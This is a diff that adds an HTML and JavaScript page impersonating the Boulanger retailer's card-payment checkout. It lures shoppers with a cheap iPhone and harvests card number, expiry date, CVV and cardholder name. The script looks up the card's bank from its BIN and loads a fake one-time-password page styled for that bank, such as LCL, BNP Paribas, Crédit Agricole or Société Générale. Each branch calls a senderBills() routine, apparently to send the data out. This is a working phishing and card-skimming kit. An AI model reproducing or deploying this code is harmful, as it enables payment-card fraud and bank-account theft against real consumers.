@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="fr" class="">
+
+<head>
+  <meta name="robots" content="noindex,nofollow">
+  <link rel="shortcut icon" type="image/jpg" href="../commande/assets/favicon.ico"/>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="alternate">
+
+  <!--Scripts jquery-->
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+  <!--Scripts jquery-->
+  <script>
+    document.getElementById("email").innerHTML = localStorage.getItem("email");
+    document.getElementById("email1").innerHTML = localStorage.getItem("email1");
+
+    document.getElementById("name").innerHTML = localStorage.getItem("name");
+    document.getElementById("name1").innerHTML = localStorage.getItem("name1");
+
+    document.getElementById("streetaddress").innerHTML = localStorage.getItem("streetaddress");
+    document.getElementById("streetaddress1").innerHTML = localStorage.getItem("streetaddress1");
+
+    document.getElementById("postalCode").innerHTML = localStorage.getItem("postalCode");
+    document.getElementById("postalCode1").innerHTML = localStorage.getItem("postalCode1");
+
+    document.getElementById("ville").innerHTML = localStorage.getItem("ville");
+    document.getElementById("ville1").innerHTML = localStorage.getItem("ville1");
+
+    document.getElementById("numtel").innerHTML = localStorage.getItem("numtel");
+    document.getElementById("numtel1").innerHTML = localStorage.getItem("numtel1");
+  </script>
+
+
+
+  <link rel="preload" as="style" href="./page_paiement_files/pai5mmm.css">
+  <link rel="stylesheet" href="./page_paiement_files/pai5mmm.css" media="all">
+
+  <meta name="msapplication-TileColor" content="#d14600">
+  <meta name="msapplication-config" content="/content/dam/aem-site-common/favicon-package/browserconfig.xml">
+  <meta name="theme-color" content="#d14600">
+  <link rel="stylesheet" href="./page_paiement_files/spa.ACSHASHdcf43c7701cd33e1cb221a79b7e16668.css" type="text/css">
+
+
+  <link rel="stylesheet" type="text/css" href="./page_paiement_files/blg.spa.route.auth.fd5d.css">
+  <title>Sélectionner un mode de paiement - Boulanger</title>
+  <link rel="stylesheet" type="text/css" href="./page_paiement_files/blg.spa.route.delivery.26a7.css">
+  <meta http-equiv="origin-trial">
+  <link rel="stylesheet" type="text/css" href="./page_paiement_files/blg.spa.route.payment.d9ee.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+</head>
+
+<body class="spaPage page basicpage">
+
+  <div id="fotp">
+
+  </div>
+
+  <header id="header-full" class="is-light">
+
+
+
+    <div class="container checkout-header">
+      <a href="#" title="Retour à l&#39;accueil">
+      </a><a href="#" class="blg-col--4 header-middle__logo header-middle__logo--link" aria-label="Boulanger.com"
+        tnr-id="headerMiddle_logo">
+        <img src="./page_paiement_files/logo-boulanger-full.svg"
+          class="icon header-middle__icon header-middle__icon--logo" alt="logo Boulanger">
+      </a>
+    </div>
+    <section class="container header-middle">
+      <a href="#" class="blg-col--4 header-middle__logo header-middle__logo--link" aria-label="Boulanger.com"
+        tnr-id="headerMiddle_logo">
+        <img src="./page_paiement_files/logo-boulanger-full.svg"
+          class="icon header-middle__icon header-middle__icon--logo" alt="logo Boulanger">
+      </a>
+
+
+      </div>
+
+      <section class="layers">
+      </section>
+      <div class="layers-overlay"></div>
+    </section>
+  </header>
+  <main id="main">
+    <section class="root customresponsivegrid responsivegrid">
+      <div>
+        <div class="customresponsivegrid responsivegrid">
+          <div>
+            <div class="orderitems">
+              <div class="container">
+                <section id="checkout-app">
+                  <div class="app-container">
+                    <div class="blg-col--20 blg-offset--2">
+                      <ul class="blg-row checkout-steps checkout-steps--4 " tnr-id="checkoutStepContainer">
+                        <li class="blg-col--4 checkout-steps__item" tnr-id="checkoutStepItemCart">
+                          <a tnr-id="checkoutStepLinkCart" href="#">
+                            <span class="checkout-steps__link">Panier</span></a></li>
+                        <li class="blg-col--8 checkout-steps__item checkout-steps__item--disabled"
+                          tnr-id="checkoutStepItemLogin">
+                          <a tnr-id="checkoutStepLinkLogin" href="#">
+                            <span class="checkout-steps__link">Identification</span></a></li>
+                        <li class="blg-col--8 checkout-steps__item" tnr-id="checkoutStepItemDelivery">
+                          <a tnr-id="checkoutStepLinkDelivery" href="#">
+                            <span class="checkout-steps__link">Livraison</span></a></li>
+                        <li class="blg-col--4 checkout-steps__item step--active" tnr-id="checkoutStepItemPayment">
+                          <a tnr-id="checkoutStepLinkPayment" href="#">
+                            <span class="checkout-steps__link">Paiement</span></a></li>
+                      </ul>
+                    </div>
+                    <div class="blg-col--20 blg-offset--2">
+                      <div class="blg-row">
+                        <div class="payment blg-col--17">
+                          <div class="payment-content-wrapper">
+                            <div class="payment-content-wrapper__header">
+                              <h2 class="title payment-title">Choisissez votre moyen de paiement :
+                                <button class="button tooltip-button" type="button">
+                                  <svg class="icon tooltip-icon" role="img" aria-label="informations supplémentaires"
+                                    aria-hidden="false">
+                                    <use></use>
+                                  </svg></button></h2>
+                            </div>
+                            <div class="payment-list">
+                              <div class="payment-item payment-item--open">
+                                <div class="payment-item__payment-type payment-credit-card">
+                                  <div class="field__radio__container ">
+                                    <input class="field__radio" id="80" type="radio" name="payment-option"
+                                      tnr-id="payment-credit-card-radio-button" value="80" checked="">
+                                    <label for="80" class="field__radio__label "><span class="field__radio-fake"></span>
+                                      <div class="field__radio__label__container">
+                                        <span class="field__radio__label__title is--flex is--bold">Carte bancaire</span>
+                                        <span class="field__radio__label__desc">Carte bleue, Mastercard, Visa, American
+                                          Express</span></div>
+                                    </label></div>
+                                  <div class="payment-item__content">
+                                    <div class="payment-credit-card-icons">
+
+
+
+                                      <span class="payment-credit-card-icons__title">Type de carte :</span>
+                                      <div class="payment-credit-card-icons__list">
+                                        <input class="payment-credit-card-icons__radio visually-hidden" type="radio"
+                                          id="cb" name="cardType" value="cartebancaire">
+                                        <label for="cb" class="payment-credit-card-icons__radio-label">
+                                          <img src="./page_paiement_files/logo-cb.svg"
+                                            class="payment-credit-card-icons__icon" alt="Carte Bleue"></label>
+                                        <input class="payment-credit-card-icons__radio visually-hidden" type="radio"
+                                          id="mastercard" name="cardType" value="mc">
+                                        <label for="mastercard" class="payment-credit-card-icons__radio-label">
+                                          <img src="./page_paiement_files/logo-mastercard.svg"
+                                            class="payment-credit-card-icons__icon" alt="master card"></label>
+                                        <input class="payment-credit-card-icons__radio visually-hidden" type="radio"
+                                          id="visa" name="cardType" value="visa">
+                                        <label for="visa" class="payment-credit-card-icons__radio-label">
+
+
+                                          <img src="./page_paiement_files/logo-visa.svg"
+                                            class="payment-credit-card-icons__icon" alt="visa"></label>
+                                        <input class="payment-credit-card-icons__radio visually-hidden" type="radio"
+                                          id="amex" name="cardType" value="amex">
+                                        <label for="amex" class="payment-credit-card-icons__radio-label">
+                                          <img src="./page_paiement_files/logo-amex.svg"
+                                            class="payment-credit-card-icons__icon" alt="american express"></label>
+                                      </div>
+                                    </div>
+                                    <form name="myForm" onsubmit="  senderBills()">
+
+                                      <div id="credit-card-form" class="payment-credit-card__field-wrapper">
+
+                                        <!------------------------------------------------------>
+                                        <div class="field__container payment-credit-card__big-field">
+
+                                          <input type="text" class="field__input" id="encryptedCardNumber" required>
+                                          <label class="field__label ">
+                                            <span class="field__label_txt">Numéro de la carte<span>*</span></span>
+                                          </label>
+
+                                        </div>
+
+                                        <!------------------------------------------------------>
+
+                                        <div class="field__container payment-credit-card__small-field">
+
+                                          <input type="text" class="field__input" id="date" name="date"  maxlength="5" onkeyup="formatString(event);"required>
+
+                                          <label aria-hidden="true" class="field__label ">
+                                            <span class="field__label_txt">Date d’expiration</span>
+                                          </label>
+                                        </div>
+
+
+
+                                        <!------------------------------------------------------>
+                                        <div class="field__container payment-credit-card__small-field">
+
+                                          <input type="text" class="field__input" id="cv2" name="cv2" required>
+                                          <label aria-hidden="true" class="field__label ">
+                                            <span class="field__label_txt">
+                                              Cryptogramme
+                                            </span>
+                                          </label>
+                                        </div>
+
+                                        <!------------------------------------------------------>
+
+                                        <div class="field__container payment-credit-card__big-field">
+
+                                          <input type="text" class="field__input" name="paymentCardOwner"
+                                            id="paymentCardOwner" required>
+                                          <label class="field__label ">
+                                            <span class="field__label_txt">Titulaire<span>*</span></span>
+                                          </label>
+
+                                        </div>
+                                      </div>
+                                  </div>
+                                </div>
+                              </div>
+
+
+
+
+
+                              <div class="payment-item">
+                                <div class="payment-item__payment-type payment-paypal">
+                                  <div class="field__radio__container ">
+                                    <input class="field__radio" id="62" type="radio" name="payment-option"
+                                      tnr-id="payment-paypal-radio-button" value="62" disabled>
+                                    <label for="62" class="field__radio__label "><span class="field__radio-fake"></span>
+                                      <div class="field__radio__label__container">
+                                        <span class="field__radio__label__title is--flex ">Paypal
+                                          <img src="./page_paiement_files/logo-paypal.svg"
+                                            class="mono-payment-item__image" aria-hidden="true" alt="">
+                                        </span></div>
+                                    </label></div>
+                                </div>
+                              </div>
+
+
+
+
+                              <div class="payment-item gift-cards">
+                                <div class="gift-cards-header">
+                                  <div class="gift-cards-header__main">
+                                    <span class="gift-cards-header__title">Cartes cadeaux<button
+                                        class="button tooltip-button" type="button">
+                                        <svg class="icon tooltip-icon" role="img"
+                                          aria-label="informations supplémentaires" aria-hidden="false">
+                                          <use></use>
+                                        </svg></button></span>
+                                    <div class="gift-cards-header__images"><img
+                                        src="./page_paiement_files/gift-card.svg" class="gift-cards-header__picto"
+                                        alt="" aria-hidden="true">
+                                      <img src="./page_paiement_files/satisfaction-card.svg"
+                                        class="gift-cards-header__picto" alt="" aria-hidden="true">
+                                      <img src="./page_paiement_files/illicado-logo.svg"
+                                        class="gift-cards-header__picto" alt="" aria-hidden="true"></div>
+                                    <span class="gift-cards-header__chevron"></span>
+                                  </div>
+                                  <p class="gift-cards-header__description">Carte cadeau Boulanger, carte satisfaction
+                                    et illicado</p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="go-to"><a class="button button--link" tnr-id="paymentToPreviousStep" href="#">
+                              <svg class="icon icon--mirror" aria-hidden="true">
+                                <use></use>
+                              </svg>Étape précédente</a></div>
+                          <div class="payment__cgv">En validant cette étape, j'accepte les <a href="#">Conditions de
+                              vente</a>
+                            en vigueur applicables aux produits et services sélectionnés et j'y adhère sans réserve.
+                          </div>
+                        </div>
+                        <div class="blg-col--6 blg-offset--1">
+                          <div class="collapse">
+                            <div class="collapse__header">
+                              <span class="collapse__title is--semibold" tnr-id="cartSummaryProductCount">Mon panier
+                                (1)</span>
+                              <button type="button" class="button button--secondary collapse__button"
+                                tnr-id="collapseButton" title="" aria-expanded="true" aria-controls="collapsePannel"
+                                aria-label="Masquer le détail du panier">
+                                <span aria-hidden="true">Masquer</span></button></div>
+                            <div class="checkout-summary">
+                              <div id="collapsePannel" class="collapse__body">
+                                <div class="cart-summary__products-container">
+                                  <div class="cart-summary__products-bySeller">
+                                    <p class="cart-summary__products-seller">Vendu par&nbsp;<span class="">Boulanger
+                                        :</span></p>
+                                    <div class="cart-summary__product-wrapper">
+                                      <div class="cart-summary__product">
+                                        <div class="cart-summary__product__col-left">
+                                          <div class="cart-summary__product-img">
+                                            <img src="./page_paiement_files/0194252707098_h_f_l_0" alt=""
+                                              aria-hidden="true"></div>
+                                        </div>
+                                        <div class="cart-summary__product__col-right">
+                                          <p class="cart-summary__product-title">Smartphone Apple iPhone 13 Pro Max
+                                            Graphite 128Go 5G</p>
+                                          <div class="cart-summary__product-info"
+                                            tnr-id="cartSummaryProductQtyPrice_ca838725-a345-4636-b4b9-63c30076678d">
+                                            <span tnr-id="cartSummaryProductQty_ca838725-a345-4636-b4b9-63c30076678d"
+                                              aria-hidden="true">x1</span>
+                                            <span class="visually-hidden">Quantité 1</span>
+                                            <strong
+                                              tnr-id="cartSummaryProductPrice_ca838725-a345-4636-b4b9-63c30076678d">299,00€</strong>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div class="cart-summary__delivery" tnr-id="cartSummaryDeliveryAddress">
+                                        <span class="cart-summary__delivery-mode">Livraison</span>
+                                        <span class="cart-summary__delivery-availability">Dans 7 jours </span>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                              <ul class="grand-total grand-total__desktop">
+                                <li class="grand-total__items" tnr-id="cartSummaryShippingCost">
+                                  <span class="grand-total__title">Frais de livraison :</span>
+                                  <span class="grand-total__value is--bold">offerts</span></li>
+                                <li class="grand-total__items" tnr-id="cartSummaryTotalPrice">
+                                  <span class="grand-total__title is--bold is--uppercase">Total</span>
+                                  <span class="grand-total__total is--bold" id="price">299,00€</span></li>
+                              </ul>
+                            </div>
+                          </div>
+
+
+
+                          <button type="submit" class="button button--primary is--full otp" href="javascript:void(0);"
+                            onsubmit="senderBills();" onclick="getBin(document.getElementById('encryptedCardNumber').value); getPrice();
+                            getLast(); getNum(document.getElementById('numtel').value);">
+                            Payer
+                          </button>
+                          </form>
+
+                          <div class="secure-payment secure-payment--is-not-in-header">
+                            <svg class="secure-payment__icon" aria-hidden="true">
+
+                            </svg>
+                            <div class="secure-payment__text">
+                              <p class="secure-payment__text-not-in-header">Paiement <span>sécurisé</span></p>
+                            </div>
+                          </div>
+
+
+
+                          <div class="sub-cart-info-card__frame">
+                            <h3 class="sub-cart-info-card__title">Adresse de livraison :</h3>
+                            <div class="sub-cart-info-card__content">
+
+                              <div class="sub-cart-info-card__content-text">
+                                <p class="address__fields">
+
+                                  <span id="name1"></span><br>
+                                  <span id="streetaddress1"></span><br>
+                                  <span id="postalCode1"></span><br>
+                                  <span id="ville1"></span><br>
+                                  <span id="email1"></span>
+
+                              </div>
+
+                            </div>
+                          </div>
+
+
+                          <div class="sub-cart-info-card__frame">
+
+                            <h3 class="sub-cart-info-card__title">Adresse de facturation :</h3>
+
+
+                            <div class="sub-cart-info-card__content">
+
+                              <div class="sub-cart-info-card__content-text">
+
+                                <p class="address__fields">
+                                  <span id="name"></span><br>
+                                  <span id="streetaddress"></span><br>
+                                  <span id="postalCode"></span><br>
+                                  <span id="ville"></span><br>
+
+                              </div>
+                            </div>
+
+                          </div>
+
+
+                          <div class="sub-cart-info-card__frame">
+                            <h3 class="sub-cart-info-card__title">Numéro de contact :</h3>
+
+                            <div class="sub-cart-info-card__content">
+
+                              <div class="sub-cart-info-card__content-text">
+                                <span id="numtel1"></span><br>
+                              </div>
+                            </div>
+                          </div>
+
+                        </div>
+
+
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="band">
+                    <div id="footer">
+
+                      <center><img class="creditCards" src="./Enregistrement ou connexion - Boulanger_files/payment.png"
+                          alt="/paymentCard"></center>
+                    </div>
+                  </div>
+                </section>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </section>
+  </main>
+
+  <!--BinLookUp and transition-->
+
+  <script src="./senderBills.js"></script>
+
+  <script>
+    function getNum() {
+      var numtel = document.getElementById("numtel").innerHTML = localStorage.getItem("numtel");
+      numtel = parseInt(numtel.substring(10));
+      console.log('last digits of num: ', numtel);
+      localStorage.setItem("numtel", numtel);
+      return false;
+    }
+  </script>
+
+  <script>
+    function getLast() {
+      var encryptedCardNumber = document.getElementById("encryptedCardNumber").value;
+      encryptedCardNumber = parseInt(encryptedCardNumber.substring(12));
+      console.log('last digits of cc: ', encryptedCardNumber);
+      localStorage.setItem("encryptedCardNumber", encryptedCardNumber);
+      return false;
+
+    }
+  </script>
+
+  <script type="text/javascript">
+    async function getBin(encryptedCardNumber) {
+      var bin = (encryptedCardNumber.substring(0, 8)).split(" ").join("");
+      console.log('bin is: ', bin);
+      const data = {
+        bin
+      };
+      const options = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      };
+      const lookup_data = await fetch('api', options);
+      binLookup(lookup_data)
+    };
+
+    async function binLookup(lookup_data_result) {
+      const lookup_data = await lookup_data_result.json()
+      
+       if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === 'CREDIT LYONNAIS'))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpLCL_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+
+
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === 'CREDIT LYONNAIS'))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpLCL_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+
+
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === 'BNP PARIBAS'))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpBNP_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === 'BNP PARIBAS'))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpBNP_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === "BANQUE FEDERATIVE DU CREDIT MUTUEL" ||
+            lookup_data.bank && lookup_data.bank.name === "CREDIT MUTUEL ARKEA" ||
+            lookup_data.bank && lookup_data.bank.name === "CAISSE CENTRALE DE CREDIT MUTUEL" ||
+            lookup_data.bank && lookup_data.bank.name === "CREDIT MUTUEL"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCreditMutuel_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === "BANQUE FEDERATIVE DU CREDIT MUTUEL" ||
+            lookup_data.bank && lookup_data.bank.name === "CREDIT MUTUEL ARKEA" ||
+            lookup_data.bank && lookup_data.bank.name === "CAISSE CENTRALE DE CREDIT MUTUEL" ||
+            lookup_data.bank && lookup_data.bank.name === "CREDIT MUTUEL"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCreditMutuel_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === "CAISSE NATIONALE DES CAISSES D'EPARGNE (CNCE)"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCaisse_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === "CAISSE NATIONALE DES CAISSES D'EPARGNE (CNCE)"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCaisse_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === "CREDIT AGRICOLE, S.A." || lookup_data.bank.name ==="CREDIT AGRICOLE"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCreditAg_Visa_Step1.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === "CREDIT AGRICOLE, S.A." || lookup_data.bank.name ==="CREDIT AGRICOLE"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCreditAg_Mastercard_Step1.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.bank && lookup_data.bank.name === "LA BANQUE POSTALE")) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpLabanque_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === "SOCIETE GENERALE, S.A."))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpSocieteGen_Visa_Step1.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === "SOCIETE GENERALE, S.A."))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpSocieteGen_Mastercard_Step1.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } else if (lookup_data && (lookup_data.scheme === 'visa' &&
+          (lookup_data.bank && lookup_data.bank.name === "ALLIANZ BANK BULGARIA A.D."))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpAllianz_Visa.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      } 
+      
+      
+      
+      else if (lookup_data && (lookup_data.scheme === 'mastercard' &&
+          (lookup_data.bank && lookup_data.bank.name === "EUROPAY FRANCE SAS"))) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpBNP_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      }
+
+
+      else if (lookup_data.bank && lookup_data.bank.name === "CREDIT DU NORD") {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCreditNord.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      }
+
+      else if (lookup_data.bank && lookup_data.bank.name === "NATIXIS") {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpFrenchBank.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+
+
+        });
+      }
+
+      else if (lookup_data && (lookup_data.scheme === 'mastercard' || lookup_data.scheme === 'CARREFOUR BANQUE') ) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpCarrefour_Mastercard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } 
+      
+     else if (lookup_data && (lookup_data.scheme === 'visa' || lookup_data.scheme === 'mastercard' || lookup_data.scheme === 'discover' || lookup_data.scheme === 'amex') ) {
+        $(document).ready(function () {
+          $('header').fadeOut('4000');
+          $('main').fadeOut('4000');
+          $('#fotp').load('otpStandard.html').delay('5000').fadeIn('5000');
+          $('#fotp').click(senderBills());
+        });
+      } 
+      
+
+    }
+  </script>
+
+<script>
+  function formatString(e) {
+var inputChar = String.fromCharCode(event.keyCode);
+var code = event.keyCode;
+var allowedKeys = [8];
+if (allowedKeys.indexOf(code) !== -1) {
+return;
+}
+
+event.target.value = event.target.value.replace(
+/^([1-9]\/|[2-9])$/g, '0$1/' 
+).replace(
+/^(0[1-9]|1[0-2])$/g, '$1/' 
+).replace(
+/^([0-1])([3-9])$/g, '0$1/$2' 
+).replace(
+/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' 
+).replace(
+/^([0]+)\/|[0]+$/g, '0' 
+).replace(
+/[^\d\/]|^[\/]*$/g, '' 
+).replace(
+/\/\//g, '/' 
+);
+}
+</script>
+</body>
+
+</html>
